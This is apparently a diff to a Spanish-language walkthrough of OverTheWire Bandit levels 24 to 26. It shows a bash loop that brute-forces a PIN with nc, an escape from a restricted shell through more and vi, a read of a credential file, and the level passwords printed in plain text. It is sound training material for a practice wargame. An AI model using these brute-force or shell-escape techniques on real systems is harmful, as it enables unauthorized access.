@@ -1246,3 +1246,76 @@ hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
 <Callout type="success" title="Password Bandit24">
 hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
 </Callout>
+
+## Bandit Level 24 → Level 25
+
+[Bandit Level 24 → Level 25](https://overthewire.org/wargames/bandit/bandit25.html)
+
+```bash
+ssh -p 2220 bandit24@bandit.labs.overthewire.org
+```
+
+```bash
+for i in $(seq 0000 9999); do echo 'hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv' $i; done | nc localhost 30002
+```
+
+```plaintext
+<SNIP>
+Wrong! Please enter the correct current password and pincode. Try again.
+Correct!
+The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+```
+
+<Callout type="success" title="Password Bandit25">
+SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+</Callout>
+
+## Bandit Level 25 → Level 26
+
+[Bandit Level 25 → Level 26](https://overthewire.org/wargames/bandit/bandit26.html)
+
+```bash
+ssh -p 2220 bandit25bandit.labs.overthewire.org
+```
+
+```bash
+ls -la
+```
+
+```plaintext
+total 40
+drwxr-xr-x   2 root     root     4096 Jun 24 14:59 .
+drwxr-xr-x 150 root     root     4096 Jun 24 15:02 ..
+-rw-r-----   1 bandit25 bandit25   33 Jun 24 14:59 .bandit24.password
+-rw-r-----   1 bandit25 bandit25  151 Jun 24 14:59 .banner
+-rw-r--r--   1 root     root      220 Feb 13 12:16 .bash_logout
+-rw-r--r--   1 root     root     3851 Jun 24 14:50 .bashrc
+-rw-r-----   1 bandit25 bandit25   66 Jun 24 14:59 .flag
+-rw-r-----   1 bandit25 bandit25    4 Jun 24 14:59 .pin
+-rw-r--r--   1 root     root      807 Feb 13 12:16 .profile
+-r--------   1 bandit25 bandit25 2602 Jun 24 14:59 bandit26.sshkey
+```
+
+```bash
+scp -P 2220 bandit25@bandit.labs.overthewire.org:~/bandit26.sshkey .
+```
+
+```bash
+chmod 600 bandit26.sshkey 
+```
+
+Cambiar el tamaño de la terminal para que al ejecutarse el comando `more` entre en modo paginación
+
+Presionar la tecla `v` para entrar en el editor `vi`, presionar la tecla `esc`, `:` e ingresar el comando `set shell=/bin/bash` y luego ejecutar el comando `shell`
+
+```bash
+cat /etc/bandit_pass/bandit26
+```
+
+```plaintext
+jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
+```
+
+<Callout type="success" title="Password Bandit26">
+jHdv2ELQhT22BkprMNDjybZDAkw1zeBJ
+</Callout>
